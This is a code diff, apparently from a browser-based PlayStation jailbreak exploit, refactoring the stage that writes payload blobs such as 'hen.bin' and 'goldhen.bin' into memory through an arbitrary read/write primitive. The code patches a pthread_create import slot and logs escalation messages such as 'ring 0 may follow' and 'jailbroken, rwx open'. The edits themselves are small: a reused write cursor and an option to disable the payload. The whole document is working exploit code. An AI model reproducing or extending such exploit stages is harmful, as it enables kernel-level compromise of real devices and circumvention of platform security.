@@ -1021,22 +1021,24 @@ async function loadPayload(url, preloaded) {
   }
 
   const words = new Uint32Array(blob.buffer, blob.byteOffset, Math.floor(blob.length / 4));
-  for (let o = 0; o < blob.length; o += 8) {
+  // Reuse one pointer per pass to avoid allocating an int64 for every word.
+  let cursor = v(entry.low, entry.hi);
+  for (let o = 0; o < blob.length; o += 8, cursor.add32inplace(8)) {
     const index = o >>> 2;
     const lo = (words[index] || 0) >>> 0;
     const hi = (words[index + 1] || 0) >>> 0;
-    c.p.write8(plus(entry, o), v(lo, hi));
+    c.p.write8(cursor, v(lo, hi));
   }
-  for (let o = 0; o < blob.length; o += 8) {
+  cursor = v(entry.low, entry.hi);
+  for (let o = 0; o < blob.length; o += 8, cursor.add32inplace(8)) {
     const index = o >>> 2;
     const lo = (words[index] || 0) >>> 0;
     const hi = (words[index + 1] || 0) >>> 0;
-    const q = c.p.read8(plus(entry, o));
+    const q = c.p.read8(cursor);
     if ((q.low >>> 0) !== lo || (q.hi >>> 0) !== hi) {
       say("[p] copy mismatch at 0x" + o.toString(16)); return false;
     }
   }
-
   const SLOT_SHARED_WK = 0x3cb9c00;
   const slot = (c.off && c.off.wk___imp_pthread_create !== undefined)
     ? c.off.wk___imp_pthread_create : SLOT_SHARED_WK;
@@ -1186,11 +1188,13 @@ async function loadGoldhen(url, k, kbase, room, preloaded) {
   }
   say("[g] trampoline page executes in ring 3, so ring 0 may follow");
 
+  let cursor = v(buf.low, buf.hi);
   for (let o = 0; o < blob.length; o += 8) {
     let lo = 0, hi = 0;
     for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
     for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
-    c.p.write8(plus(buf, o), v(lo >>> 0, hi >>> 0));
+    c.p.write8(cursor, v(lo >>> 0, hi >>> 0));
+    cursor.add32inplace(8);
   }
   say("[g] " + blob.length + " bytes at " + text(buf));
 
@@ -1961,11 +1965,12 @@ async function attempt(ctx, opts) {
 
   const want = (ctx.params && ctx.params.get("payload"));
   const mode = (ctx.params && ctx.params.get("mode")) || "";
-  if (want !== "") {
+  if (want !== "" && want !== "0") {
     iface.payload = (mode === "goldhen")
       ? await loadEnabler(want || "goldhen.bin", k, kbase, hostFree)
       : await loadPayload(want || "hen.bin");
   }
+  if (want === "0") say("[p] payload disabled by request");
   say("done -- jailbroken, rwx open, syscall 11 is a kexec gate"
       + (iface.payload ? ", enabler running" : ""));
   return iface;
